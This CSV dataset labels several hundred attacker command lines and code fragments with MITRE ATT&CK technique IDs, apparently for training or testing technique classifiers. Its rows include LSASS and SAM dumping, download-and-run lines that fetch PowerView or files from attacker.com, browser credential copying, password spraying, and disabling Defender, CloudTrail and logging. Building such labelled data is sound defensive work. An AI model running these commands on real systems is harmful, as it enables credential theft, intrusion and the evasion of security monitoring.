command,mitre_id
$word.Visible = $false,T1137
readelf -a @/path/to/input-file,T1005
lsass.exe,T1003
{531511FA-190D-5D85-8A4A-279F2F592CC7},T1480
GetAdaptersAddresses.,T1018
PIS-APP,T1070
net share $share_name /delete,T1070
[System.Runtime.InteropServices.Marshal]::ReleaseComObject($document) | Out-Null,T1137
start ms-appinstaller://?source={REMOTEURL:.exe},T1105
"[K]::keybd_event($VK_R, 0, $KEYUP, [UIntPtr]::Zero)",T1566
rundll32 C:\windows\system32\comsvcs.dll MiniDump {LSASS_PID} dump.bin full,T1003
if (-Not $domain.IsVerified) {,T1484
rundll32.exe keymgr.dll KRShowKeyMgr,T1555
scp.exe $username@$remote_host:$remote_path $local_path,T1105
distcc /bin/sh,T1059
winword.exe {REMOTEURL},T1105
net accounts /domain,T1201
DNSGetCacheDataTable,T1018
IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1' -UseBasicParsing); Invoke-UserHunter -Stealth -Verbose,T1033
dir c:\Users\,T1087
HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run,T1547
/dev/null,T1562
PSReadLine,T1070
WinHTTP,T1106
echo DATA >/path/to/temp-file,T1222
cat /etc/passwd > $output_file,T1003
taskkill /IM a.exe /F,T1204
"r.urlretrieve(""http://attacker.com/path/to/input-file"", ""/path/to/output-file"")'",T1105
findstr,T1083
./stratus detonate aws.defense-evasion.vpc-remove-flow-logs --force,T1562
Tracker.exe /d {PATH:.dll} /c C:\Windows\write.exe,T1127
SetErrorMode,T1562
sftp.exe $username@$remote_host:$remote_path $local_path,T1105
genisoimage -q -o - /path/to/input-file,T1005
watch -x /bin/sh -c 'reset; exec /bin/sh 1>&0 2>&0',T1059
Volume Information,T1485
"Copy-Item $profile\key4.db -Destination ""PathToAtomicsFolder\..\ExternalPayloads"" > $null",T1555
photo_high_re\u202Egnp.js,T1036
CtrlPanel S-6-81-3811-75432205-060098-6872 0 0 905,T1218
"copy ""$ps1_path"" %temp%\T1036.007_masquerading.doc.ps1 /Y",T1036
System.Security.AccessControl,T1087
usermod --unlock art,T1078
utimes(),T1070
/save /path/to/output-file,T1222
0x17 0x03 0x04,T1001
openssl enc -aes-256-cbc -pass pass:$enc_pass -p -in $input_folder/$input_file.zip -out $input_folder/$input_file.enc,T1560
"net user ""$username"" ""$password"" /add /domain",T1136
CPlApplet,T1218
echo $ART |/bin/sh,T1059
base58 /path/to/input-file | base58 --decode,T1005
dmsetup ls --exec '/bin/sh -s',T1059
"[ ""$(uname)"" = 'FreeBSD' ] && sysrc tor_enable=""YES"" && service tor start || sudo systemctl start tor",T1090
C:\WINDOWS\ntshrui.dll,T1574
"New-ItemProperty -Path ""HKCU:\Software\Microsoft\Office\16.0\Excel\Security"" -Name ""VBAWarnings"" -Value ""1"" -PropertyType ""Dword""",T1562
GetPrintProcessorDirectory,T1547
"AgentExecutor.exe -powershell ""{PATH_ABSOLUTE:.ps1}"" ""{PATH_ABSOLUTE:.1.log}"" ""{PATH_ABSOLUTE:.2.log}"" ""{PATH_ABSOLUTE:.3.log}"" 60000 ""{PATH_ABSOLUTE:folder}"" 0 1",T1218
ListView_SortItems,T1055
"cscript.exe /E:Jscript ""C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\jsestartup.jse""",T1547
cmd.exe /c echo regsvr32.exe ^/s ^/u ^/i:{REMOTEURL:.sct} ^scrobj.dll > {PATH}:payload.bat,T1564
aws cloudtrail delete-trail --name $cloudtrail_name --region $region,T1562
then echo '#art_test_1562_006_2' >> /etc/$syslog_config_file_name,T1562
WantedBy=multi-user.target,T1543
do_download,T1105
rpmverify --eval '%(/bin/sh 1>&2)',T1059
.sdira,T1083
Start-Process whoami.exe,T1546
aws guardduty update-detector --no-enable --detector-id $detectorId,T1562
File.txt,T1036
<permissions>,T1222
reg save HKLM\SECURITY {PATH_ABSOLUTE:.1.bak} && reg save HKLM\SYSTEM {PATH_ABSOLUTE:.2.bak} && reg save HKLM\SAM {PATH_ABSOLUTE:.3.bak},T1003
echo /path/to/temp-file | cpio -udp .,T1222
"az ad user list --filter ""displayname eq 'atomicredteam'""",T1136
$ADSearch.PropertiesToLoad.Clear(),T1552
"schtasks /create /s targetmachine /tn ""MyTask"" /tr ""{CMD}"" /sc daily",T1053
"ForEach($CLSID in Get-Content ""$env:temp\clsids.txt"")",T1012
mshta,T1218
"import-module ""PathToAtomicsFolder\..\ExternalPayloads\Invoke-EnumerateAzureBlobs.ps1""",T1619
FSCTL_MOVE_FILE,T1485
bginfo.exe {PATH:.bgi} /popup /nolicprompt,T1218
System.Reflection.Assembly,T1620
"reg add ""HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer"" /v StartMenuLogOff /t REG_DWORD /d 1 /f",T1112
service.exe,T1570
property * | findstr “Address””,T1018
.\AActdata\,T1074
"reg add ""HKLM\SOFTWARE\Policies\Microsoft\FVE"" /v UsePIN /t REG_DWORD /d 2 /f",T1112
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-System,T1562
net time,T1124
"Remove-ADGroupMember -Identity ""Domain Admins"" -Members $remove_user -Credential $Credential -Confirm:$False",T1531
new-itemproperty $key$name -Name http -Value 2 -Type DWORD;,T1112
mpsvc.dll,T1574
efax -d /path/to/input-file,T1005
} catch {},T1046
"echo ""# Default-Start: 2 3 4 5"" >> /etc/init.d/T1543.002",T1543
printf $ENCODED | b64decode -r,T1140
tmux -c /bin/sh,T1059
.config/solana/id.json,T1555
mshta.exe,T1218
launchctl load -w,T1569
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce*aster = %Public%\enc.exe,T1547
if [ -f /usr/local/etc/sudoers ]; then sudo cat /usr/local/etc/sudoers > $output_file; fi;,T1087
split -b 999 --additional-suffix suffix /path/to/input-file prefix,T1005
takeown /F C:\Windows\System32\DisplaySwitch.exe /A,T1546
"if [ ""$(csrutil status | grep -v 'enabled')"" != """" ]; then echo 'Possible Virtualization Environment detected'; fi;",T1497
swapon -a,T1562
garble,T1027
Unblock-File -Path $file_path,T1553
diskshadow.exe,T1490
netstat.exe -f,T1049
"wmic /node:""$target_host"" shadowcopy call create Volume=$drive_letter",T1003
$excelApp.Quit(),T1137
ExampleFunction,T1218
"SyncAppvPublishingServer.vbs ""n; {PowerShell}""",T1216
"mshta.exe ""{PATH_ABSOLUTE}:file.hta""",T1218
"Copy-Item ""$PathToAtomicsFolder\T1547.003\bin\AtomicTest.dll"" C:\Users\Public\AtomicTest.dll",T1547
Set-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System -Name ConsentPromptBehaviorAdmin -Value 0 -Type Dword -Force,T1548
fltmc.exe | findstr.exe 385201,T1518
$env:COR_ENABLE_PROFILING = 1,T1574
"""$TEMPDIR/env/bin/python"" -c ""print('Triggering Hook via atomic_hook...')""",T1546
tftp,T1105
MsBuild.exe,T1057
"Copy-Item ""$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data"" -Destination ""PathToAtomicsFolder\..\ExternalPayloads""",T1555
Goopdate.dll,T1574
SIGTTOU,T1564
"if [ -x ""$(command -v lspci)"" ]; then sudo lspci | grep -i ""vmware\|virtualbox""; fi",T1082
aws iam get-account-password-policy,T1201
foreach ($secondarydirectory in $folderarray),T1083
Name = $_.PSChildName,T1007
"Start-Process ""$RemotePC_Path""",T1219
msSaveBlob,T1027
net user /domain >> %temp%\download,T1087
sudo defaults write com.apple.loginwindow LoginHook $script,T1547
sudo touch /Library/StartupItems/EvilStartup.plist,T1037
mount –B,T1564
"if (-not (Test-Path ""$file_to_delete"")) { New-Item ""$file_to_delete"" -Force }",T1485
ab -v2 http://attacker.com/path/to/input-file,T1105
warzone160\x00,T1573
echo '$text_to_append' >> /etc/profile.d/bash_completion.sh,T1546
load(),T1129
com.apple.quarantineattribute,T1553
"Write-Host -ForegroundColor Green ""Password found for User:$User Password:$Password""",T1110
fping -f /path/to/input-file,T1005
zip /path/to/temp-file /path/to/input-file,T1005
"sudo lsmod | grep -i ""vmw_baloon\|vmxnet""",T1082
"python3 -c ""import base64;dec=base64.b64decode(\""$ENCODED\"");print(dec.decode())""",T1140
WTSEnumerateSessionsW,T1049
WScript.Shell,T1559
ps,T1057
"echo ""[Service]"" >> $path_to_systemd_service",T1053
"echo ""ExecStopPost=$execstoppost_action"" >> $systemd_service_path/$systemd_service_file",T1543
InstallUtil HelpText property execution test failure. Installer assembly execution output did not match the expected output.,T1218
$wc.Dispose(),T1491
if sys.version_info.major == 3: import urllib.request as r,T1105
rm -rf /var/log/security,T1070
Invoke-WCMDump,T1555
Microsoft.Storage/storageAccounts/delete,T1490
"if [ -x ""$(command -v lscpu)"" ]; then sudo lscpu | grep -i ""Xen\|KVM\|Microsoft""; fi",T1082
"& ""$TempDir\env\Scripts\python.exe"" -c ""print('Triggering Hook via atomic_hook...')""",T1546
xwizard RunWizard /taero /u {00000001-0000-0000-0000-0000FEEDACDC},T1218
dosbox -c 'mount c /' -c 'type c:\path\to\input',T1005
SHELL PID,T1082
icacls C:\Windows\System32\Narrator.exe /grant Administrators:F /t,T1546
JohnDoe,T1497
"node -e 'require(""http"").get(""http://attacker.com/path/to/input-file"", res => res.pipe(require(""fs"").createWriteStream(""/path/to/output-file"")))'",T1105
"sudo sh -c ""echo Defaults ""'!'""tty_tickets >> /etc/sudoers""",T1548
wsl.exe -e /mnt/c/Windows/System32/calc.exe,T1202
"echo ""T1564.001"" > /var/tmp/.hidden-directory/.hidden-file",T1564
echo DATA | dd of=/path/to/output-file,T1222
EhStorAuthn.exe,T1055
Invoke-watson,T1082
/home/runtime/logs,T1070
"Start-Process ""$exe_binary""",T1027
alpine -F /path/to/input-file,T1005
C:Windowsinfpub.dat,T1218
findmnt -t nfs,T1083
wmic cpu get name,T1082
rdpclip.exe,T1055
uk_UA,T1614
"New-ItemProperty -Force -Path ""HKCU:\Software\Classes\Folder\shell\open\command"" -Name ""DelegateExecute""",T1548
"osascript -e 'tell application ""Finder""' -e 'set destinationFolderPath to POSIX file ""$destination_path""' -e 'set notesFolderPath to (path to home folder as text) & ""Library:Group Containers:group.com.apple.notes:""' -e 'set notesFolder to folder notesFolderPath' -e 'set notesFiles to {file ""NoteStore.sqlite"", file ""NoteStore.sqlite-shm"", file ""NoteStore.sqlite-wal""} of notesFolder' -e 'repeat with aFile in notesFiles' -e 'duplicate aFile to folder destinationFolderPath with replacing' -e 'end' -e 'end tell'",T1005
HKLM\Software\Microsoft\Windows\CurrentVersion\spreadCpuXmr – %stratum info%,T1012
az ad user delete --id $userprincipalname,T1531
vssadmin.exe list shadows,T1082
/usr/bin/unshadow /etc/passwd /etc/shadow > /tmp/crack.password.db,T1003
ExecStopPost,T1543
ls -l@,T1564
truncate -s 0 /var/log/messages #size parameter shorthand,T1070
.\calc.exe.lnk,T1204
continue,T1562
GetTickCount,T1497
aws iam create-user --user-name $username,T1136
"Set-ItemProperty -Path $commandpath -Name ""(default)"" -Value ""$commandtorun"" -Force -ErrorAction SilentlyContinue | Out-Null",T1548
"sudo security add-trusted-cert -d -r trustRoot -k ""/Library/Keychains/System.keychain"" ""$cert_filename""",T1553
"Add-DnsClientNrptRule -Namespace ""endpoint.security.microsoft.com"" -NameServers 127.0.0.1 -Comment ""Silenced by Name Resolution Policy Table""",T1562
takeown /F C:\Windows\System32\Magnify.exe /A,T1546
Sqlps.exe -noprofile,T1218
/var/lib/sss/db/cache.[domain].ldb,T1003
mountvol.exe,T1222
ip netns delete bar,T1059
WinExec,T1546
aws iam add-user-to-group --user-name $username --group-name $username,T1098
Lost_{Unique Identifier},T1136
using System.Runtime.InteropServices;,T1491
cmd.exe /c “<command> > <%temp%>\AM<random>. tmp” 2>&1,T1059
"Add-Type @""",T1566
"HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows ""AppInit_DLLs""=""pserver32.dll""",T1546
openssl req -engine ./lib.so,T1574
"""function $cmdlets { Write-Host Pretending to invoke $cmdlets }""}",T1059
"echo ""b"" > /proc/sysrq-trigger",T1529
if ($errCode -eq 86) {,T1098
"echo ""WantedBy=multi-user.target"" >> $path_to_systemd_service",T1053
My Documents,T1485
"Import-Module ""PathToAtomicsFolder\..\ExternalPayloads\PowerView.ps1""",T1135
"echo ""\npython3 -c \""import os, base64;exec(base64.b64decode('aW1wb3J0IG9zCm9zLnBvcGVuKCdlY2hvIGF0b21pYyB0ZXN0IGZvciBtb2RpZnlpbmcgcmMubG9jYWwgPiAvdG1wL1QxMDM3LjAwNC5yYy5sb2NhbCcpCgo='))\"""" | sudo tee -a /etc/rc.local",T1037
curl -s -L -o,T1048
reg add HKLM\SYSTEM\CurrentControlSet\Control\LSA /v RunAsPPL /t REG_DWORD /d 0 /f,T1562
svehost.exe,T1036
"clisp -x '(ext:run-shell-command ""/bin/sh"")(ext:exit)'",T1059
grep 'x:0:' /etc/passwd > $output_file,T1087
LoadLibrayA,T1055
keyctl,T1611
New-ItemProperty -Path $registryPath -Name $name -Value $Value,T1546
$file.attributes='Hidden',T1564
Get-TimedScreenshot,T1113
Invoke-CimMethod,T1053
[System.Windows.Forms.SendKeys]::SendWait('{ENTER}'),T1202
"reg add ""HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp"" /v InitialProgram /t REG_SZ /d ""C:\Windows\System32\notepad.exe"" /f",T1112
"Start-Process ""$file_path\Sysinternals\accesschk.exe"" -ArgumentList ""-accepteula .""",T1555
"jrunscript -e 'cp(""http://attacker.com/path/to/input-file"",""/path/to/output-file"")'",T1105
<path>/path/to/output-dir/output-file</path>,T1222
"ldapsearch -H ldap://$domain.$top_level_domain:389 -x -D $user -w $password -b ""CN=Users,DC=$domain,DC=$top_level_domain"" ""(objectClass=group)"" -s sub -a always -z 1000 dn",T1069
mkfifo /path/to/temp-socket,T1059
%SystemRoot%\System32\,T1505
curl -sO $remote_url; chmod +x $payload_name | bash $payload_name,T1105
wscript //e:vbscript {PATH}:script.vbs,T1564
"Import-Module ""PathToAtomicsFolder\..\ExternalPayloads\AzureStealth.ps1"" -force",T1082
reg.exe query hklm\software\microsoft\windows\softwareinventorylogging /v collectionstate /reg:64,T1012
Get-ProcessTokenPrivilege,T1057
"New-ItemProperty ""HKLM:\SOFTWARE\Policies\Microsoft\Windows\System"" -Name EnableSmartScreen -PropertyType DWord -Value 0 -Force",T1484
"Invoke-WebRequest $domain -UserAgent ""Wget/1.9+cvs-stable (Red Hat modified)"" | out-null",T1071
echo $sh_encoded | b64decode -r | sh,T1140
"UACBypass -noninteractive -command ""C:\windows\system32\cmd.exe"" -technique DiskCleanup",T1548
"reg add ""HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection"" /v ""DisableScanOnRealtimeEnable"" /t REG_DWORD /d ""1"" /f >NUL 2>nul",T1562
puppet filebucket -l diff /dev/null /path/to/input-file,T1005
"wmic /node:$node process call create ""rundll32.exe \""$dll_to_execute\"" $function_to_execute""",T1047
if (!(Test-Path $UserDir)) { New-Item -ItemType Directory -Path $UserDir -Force },T1546
"copy ""$vbs_path"" %temp%\T1036.007_masquerading.xls.vbs /Y",T1036
if [ -d /Library/Preferences/ ]; then ls -la /Library/Preferences/ > $output_file; fi;,T1083
C:\Windows\System32\bitsadmin.exe /transfer $bits_job_name /Priority HIGH $remote_file $local_path,T1105
is_debugger_present,T1622
"kldstat | grep -i ""vbox""",T1082
"echo ""Unit=$systemd_service_name"" >> $path_to_systemd_timer",T1053
"reg add ""HKLM\Software\Policies\Microsoft\Windows NT\CurrentVersion\Winlogon"" /v DefaultPassword /t REG_SZ /d password1 /f",T1562
/Users,T1564
"$ShortCut.TargetPath=""cmd.exe""",T1547
WerFaultSvc,T1036
monitor capture,T1040
if (Test-Path $Copy) { Remove-Item $Copy -Recurse -Force },T1560
"mkdir -p ""$TEMPDIR""",T1546
"$env:COR_PROFILER_PATH = '""$file_name""'",T1574
Windows User Service,T1036
"$graphic.CopyFromScreen($screen.Left, $screen.Top, 0, 0, $bitmap.Size)",T1113
Presentationhost.exe {PATH_ABSOLUTE:.xbap},T1218
credwiz.exe,T1574
man man,T1548
pw usermod nobody -s /bin/sh,T1078
"Set-ItemProperty ""HKLM:\Software\Policies\Microsoft\Windows Defender\Real-Time Protection"" -Name ""DisableIOAVProtection"" -Value 1",T1562
esxcli network nic list,T1016
"rundll32.exe URL.dll,FileProtocolHandler ""PathToAtomicsFolder\T1218.011\src\akteullen.vbs""",T1218
sudo visudo -c -f /etc/sudoers,T1548
HKEY_CURRENT_USER\Software\Microsoft\Windows NT\CurrentVersion\Windows\load,T1547
cmd.exe /c chcp >&2,T1614
if (-not (Test-Path $dest_path)) {,T1218
/proc/self/status,T1622
"reg query ""HKEY_CURRENT_USER\Control Panel\International\Geo""",T1082
sudo chmod u+s /tmp/hello,T1548
"""PathToAtomicsFolder\..\ExternalPayloads\build\namedpipes_executor.exe"" --pipe 1",T1559
Invoke-WebRequest -Uri $url -OutFile $env:TEMP\PhishingAttachment.xlsm,T1566
cat /tmp/encoded.dat | $cmd > /tmp/art.sh,T1027
"Write-Host ""The content is $fileContent""",T1560
cmake -E cat /path/to/input-file,T1005
$completeMessage.Append($receivedString),T1539
"try { [System.IO.File]::Copy(""\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy$_\Windows\System32\config\$target_hive"" , ""$env:TEMP\$target_hivevss$_"", ""true"") } catch {}",T1003
trap 'command list' signals,T1546
http[:]//169.254.169.254,T1552
NSCreateObjectFileImageFromMemory,T1620
"""PathToAtomicsFolder\..\ExternalPayloads\temp_T1027js.zip\T1027js.js""",T1027
DeviceIoControl,T1106
facter --custom-dir=/path/to/dir/ x,T1548
"if [ $(history |wc -l) -eq 1 ]; then echo ""History cache cleared""; fi",T1562
"$HOME/.../sh -c ""echo $test_message""",T1036
mtr --raw -F /path/to/input-file,T1005
esxcli network firewall set,T1562
setfacl -m u:$(id -un):rwx /path/to/input-file,T1548
long luid;,T1562
"echo ""*** Configuration recorder deleted ***""",T1562
termsrv.dll,T1505
Windows Defend,T1543
do_upload,T1041
"""$gsecdump_exe"" -a",T1003
C:\Windows\System32\cmd.exe /q /c bcdedit /set {default} recoveryenabled no,T1490
aws logs create-log-stream --log-group-name $cloudwatch_log_group_name --log-stream-name $cloudwatch_log_stream_name --region $region,T1562
"reg add ""HKCU\Software\Microsoft\Windows\Windows Error Reporting"" /v DontShowUI /t REG_DWORD /d 1 /f",T1112
"SCHTASKS /Create /S $target /RU $user_name /RP $password /TN ""Atomic task"" /TR ""$task_command"" /SC daily /ST $time",T1053
HKCU\Software\Microsoft\Windows\CurrentVersion\Run\,T1547
printf '%s\n' '#!/bin/bash' | sudo tee /etc/rc.common,T1037
/var/log/syslog,T1070
"reg add ""HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\UX Configuration"" /v Notification_Suppress /t REG_DWORD /d 1 /f",T1112
systemctl start T1543.002,T1543
if ($LASTEXITCODE -ne 0) {,T1528
Start-Sleep -Seconds 5,T1036
AppData\Local\Microsoft\Windows\Explorer,T1074
sudo nmap -sS $network_range -p $port,T1046
"echo ""RDP connection established""",T1021
LZCopy,T1140
letmein,T1033
WshShortcut,T1559
CWWiFiClient,T1217
using System;,T1562
"az storage file download --account-name ""$storage_account_name"" --share-name ""$file_share_name"" -p ""$file_path"" --only-show-errors --dest $tmpFunctionCode",T1528
%WinDir%\System32\PluginManager,T1036
SecurityHealthService.exe,T1574
~/.bash_login,T1156
curl -XPOST $base64_data.$destination_url,T1132
"Write-Host ""ServiceDll value in the registry has been updated to: $newServiceDll""",T1505
dir /s c:\ >> $output_file,T1083
UpdateProcThreadAttribute API,T1562
HKLM\SYSTEM\ControlSet001\Control\Print\Environments\Windows x64\Print Processors\UDPrint” /v Driver /d “spool.dll /f,T1547
foreach($prop in $props),T1552
postrm,T1546
C:\Windows\Microsoft.NET\Framework\v4.0.30319\AddinUtil.exe -AddinRoot:.,T1218
sudo cat /etc/sudoers,T1548
sftp user@attacker.com,T1105
GetComputerName,T1082
explorer.exe {PATH_ABSOLUTE:.exe},T1202
sudo chmod g+xs $file_to_setuid,T1548
expect -c 'spawn /bin/sh;interact',T1059
check_log -F /path/to/input-file -O /dev/stdout,T1005
"rundll32.exe pcwutl.dll,LaunchApplication $exe_to_launch",T1218
takeown /F C:\Windows\System32\utilman.exe /A,T1546
EnumChildWindows,T1106
"for unamepass in $(cat /tmp/credstuffuserpass.txt);do sshpass -p `echo $unamepass | cut -d"":"" -f2` ssh -o 'StrictHostKeyChecking=no' `echo $unamepass | cut -d"":"" -f1`@$target_host;done",T1110
"Get-NetFirewallProfile | Format-Table Name, Enabled",T1518
"echo ""Description=Atomic Red Team Systemd Timer Service"" >> $path_to_systemd_service",T1053
New-Item -ItemType Directory -Path $Copy | Out-Null,T1560
LogonUserW,T1106
ls -l,T1548
Test-Connection $env:COMPUTERNAME,T1059
type {PATH_SMB} > {PATH_ABSOLUTE},T1105
NetShareEnum(),T1135
HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList,T1564
$output | Out-File -FilePath $outputFilePath -Encoding ascii,T1560
"invoke-item ""$($driveLetter):\hello.exe""",T1553
lwp-download http://attacker.com/path/to/input-file /path/to/output-file,T1105
sudo kmutil unload -p $module_path,T1547
"Mount-DiskImage -ImagePath ""$path_of_iso""",T1553
"Move-Item -Force ""\\$target\c$\ticket.kirbi"" ticket.kirbi",T1550
$PathToAtomicsFolder\T1055\bin\x64\CreateRemoteThread.exe -pid $process.Id -debug,T1055
cp -v /etc/pam.d/sshd /tmp/,T1056
mstask,T1053
"echo 'malicious_command = ""$executor $payload_file_name $script_args""' >> $python_script_name",T1059
rpmquery --eval '%(/bin/sh 1>&2)',T1059
nltest.exe /dclist,T1018
GetForegroundWindow,T1622
infpub.dat,T1110
if [ -f /sys/class/dmi/id/bios_version ]; then cat /sys/class/dmi/id/bios_version | grep -i amazon; fi,T1082
lsl,T1083
net.exe user /domain,T1087
"osascript -e 'tell application ""Finder"" to delete POSIX file ""$system_log_path""'",T1070
Common.Compress,T1560
ip netns delete foo,T1059
"reg add ""HKLM\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate\AU"" /v ""AUOptions"" /t REG_DWORD /d 2 /f",T1112
ilasm.exe {PATH_ABSOLUTE:.txt} /exe,T1127
authorized_keys,T1098
"FOR /F ""tokens=2*"" %a in ('reg query ""HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\Winword.exe"" /V PATH') do set microsoft_wordpath=%b",T1218
Muraena,T1539
driverquery /si /fo list,T1652
Get-AdvancedSetting -Entity $vm_host -Name 'Security.AccountLockFailures' | Set-AdvancedSetting -Value '0' -Confirm:$false,T1562
"mshta.exe vbscript:Close(Execute(""GetObject(""""script:{REMOTEURL:.sct}"""")""))",T1218
pubprn.vbs 127.0.0.1 script:{REMOTEURL:.sct},T1216
ThreadHideFromDebugger,T1622
sudo launchctl unload $userdaemon_plist,T1562
"az storage file upload --account-name ""$storage_account_name"" --share-name ""$file_share_name"" -p ""$file_path"" --source ""$code_to_insert_path"" --only-show-errors",T1528
chmod 777,T1222
csc.exe,T1027
ip netns exec foo /bin/ln -s /proc/1/ns/net /var/run/netns/bar,T1059
scp -S /path/to/temp-file x x:,T1059
lwp-request file:///path/to/input-file,T1005
cd %temp%,T1558
*test.txt,T1041
put /path/to/input-file output-file,T1105
Office365DCOMCheck.ps1,T1036
time /bin/sh,T1059
dscl -create,T1136
"reg add ""HKCU\Software\Microsoft\Terminal Server Client"" /v AuthenticationLevelOverride /t REG_DWORD /d 0 /f",T1112
docker cp /path/to/input-file $CONTAINER_ID:input-file,T1005
KRB5CCNAME,T1558
wmiexec.py,T1047
Write-Host $cookies,T1539
copy /Y C:\Windows\System32\cmd.exe C:\Windows\System32\utilman.exe,T1546
sudo touch $file_to_setuid,T1548
Remove-SmbShare -Name $share_name,T1070
"echo ""*** Log Stream Created ***""",T1562
kubectl create -f src/cronjob.yaml -n $namespace,T1053
aws configservice stop-configuration-recorder --configuration-recorder-name $configuration_recorder_name --region $region,T1562
adobeupdate.dat,T1036
nc -l -p 12345 >/path/to/output-file,T1105
Invoke-ReflectivePEInjection.ps1,T1055
"& '.\Excel 2016.lnk' ""PathToAtomicsFolder\T1204.002\bin\mirrorblast_emulation.xlsm""",T1204
IpOperation,T1106
Remove-CimSession -CimSession $CimSession,T1546
%systemdir%\,T1546
auditpol,T1562
sh $script_path,T1003
"copy ""$ps1_path"" %temp%\T1036.007_masquerading.pdf.ps1 /Y",T1036
CoCreateGuid,T1106
"reg add ""HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings\ZoneMap\ProtocolDefaults"" /v http /t REG_DWORD /d 0 /F",T1112
"msbuild.exe /logger:TargetLogger,{PATH_ABSOLUTE:.dll};MyParameters,Foo",T1127
"$which_python -c 'import py_compile; py_compile.compile(""$python_script_name"", ""$python_binary_name"")'",T1059
"for /F ""tokens=1,2"" %i in ('qwinsta /server:$computer_name ^| findstr ""Active Disc""') do @echo %i | find /v ""#"" | find /v ""console"" || echo %j > computers.txt",T1033
nano /path/to/output-file,T1222
"Write-Host 4.Executing KeyScrambler.exe, you should see a popup of missing KeyScramblerIE.dll, you can close this popup",T1574
end;c:close();f:close();',T1059
$fileExtensions -contains $_.Extension.ToLower(),T1005
[System.IO.Directory]::EnumerateDirectories($root) | ForEach-Object {,T1083
$which_ccencrypt -T -K $pwd_for_encrypted_file $cped_file_path,T1486
IEX (IWR 'https://raw.githubusercontent.com/dafthack/DomainPasswordSpray/94cb72506b9e2768196c8b6a4b7af63cebc47d88/DomainPasswordSpray.ps1' -UseBasicParsing); Invoke-DomainPasswordSpray -Password Spring2017 -Domain $domain -Force,T1110
ps aux >> $output_file,T1057
$User.DisplayName = $SamAccountName,T1136
api_dev_key = $apiKey,T1567
"find $file_path/.aws -name ""credentials"" -type f 2>/dev/null",T1552
then sed -i '$ a #art_test_1562_006_2' /etc/syslog-ng/$syslog_ng_config_file_name,T1562
printf $ENCODED | xxd -r -p,T1140
less /etc/hosts,T1059
1950a258-227b-4e31-a9cf-717495945fc2,T1071
"[System.IO.Compression.ZipFileExtensions]::ExtractToFile($entry, $destPath, $false)",T1562
</interface>,T1059
.msc,T1546
chmod 4777 [file],T1548
"[ ""$(uname)"" = 'FreeBSD' ] && encodecmd=""b64encode -r -"" && decodecmd=""b64decode -r"" || encodecmd=""base64 -w 0"" && decodecmd=""base64 -d""",T1059
touch Gemfile,T1548
HKLM\SYSTEM\CurrentControlSet\Control\Lsa\OSConfig\Security Packages,T1547
$totalclosed++ | Out-Null,T1016
dscl . -list /Groups,T1069
"""$dumpert_exe""",T1003
WriteProcessMemory,T1055
known_hosts,T1018
rpm opkg install x_1.0_all.deb,T1059
CreateFileW(),T1106
GetSystemDefaultUILanguage,T1614
"powershell.exe -c ""gdr -PSProvider 'FileSystem'""",T1082
NetUserAdd,T1106
echo DATA | iconv -f 8859_1 -t 8859_1 -o /path/to/output-file,T1222
MdMMaintenenceTask,T1036
auditctl -e 0,T1562
wmic baseboard get product,T1082
no logging,T1562
vim,T1548
fsutil.exe trace decode,T1218
wlQYLoPCil3niI7x8CvR9EtNtL/aeaHrZ23LP3fAsJogVTIzdnZ5Pi09ZVeHFkiB,T1140
March 25 rcs.docx,T1036
/var/run/haldrund.pid,T1480
cat resolv.conf,T1036
cat /dev/null > $history_path,T1070
